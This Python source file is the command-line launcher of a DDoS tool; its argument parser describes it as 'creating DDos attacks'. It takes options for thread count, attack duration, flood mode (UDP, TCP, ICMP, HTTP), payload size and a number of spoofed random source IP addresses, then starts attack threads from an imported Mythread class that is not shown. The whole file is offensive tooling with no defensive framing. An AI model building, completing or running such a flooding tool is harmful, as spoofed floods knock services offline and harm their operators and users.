import os 
import sys
import random
import time
import threading
import argparse
from mythread import Mythread
import signal



def building_threads(thread_numb, attack_time, attack_type, data_size, number_of_ip):


    thread_list = []

    for thread in range(thread_numb):


        t = Mythread(attack_time, attack_type, data_size, number_of_ip)

        t.start()

        thread_list.append(t)

    time.sleep(attack_time)

    thread_join(thread_list)

def thread_join(thread_list):

    for thread in thread_list:

        thread.join()

def main():

    argument_parser = argparse.ArgumentParser(description = 'creating DDos attacks')

    argument_parser.add_argument('-t', '--thread', type=int, help= ' enter the number of thread .by default 10 ', default=10)

    argument_parser.add_argument('-i', '--timeout', type = int, help='enter the attack duration', metavar= '<timeout>')

    argument_parser.add_argument('-m', '--mode', type=str, metavar= '[UDP|TCP|ICMP|HTTP]' )

    argument_parser.add_argument('-d', '--data',  default= 0, help = 'enter data size', type=int)

    argument_parser.add_argument('--rand-mode', help = 'chose random mode between [UDP|TCP|ICMP]', action='store_true')

    argument_parser.add_argument('-ip', '--adresses', help=' enter the number of random source IP adresses ', metavar='<IPv4>', type=int)

    arguments = argument_parser.parse_args()


    thread_numb  = arguments.thread

    attack_time  = arguments.timeout

    attack_type  = str(arguments.mode).upper()

    data_size    = arguments.data  

    rand_mode    = arguments.rand_mode

    number_of_ip = arguments.adresses

    # print(arguments)


    if data_size == 0:

        data_size = '0'

    if rand_mode == True:

        attack_type = '0'



        
    


  

    building_threads(thread_numb, attack_time, attack_type, data_size, number_of_ip)
    
##### if for random sorce

if __name__ == '__main__':
    main()










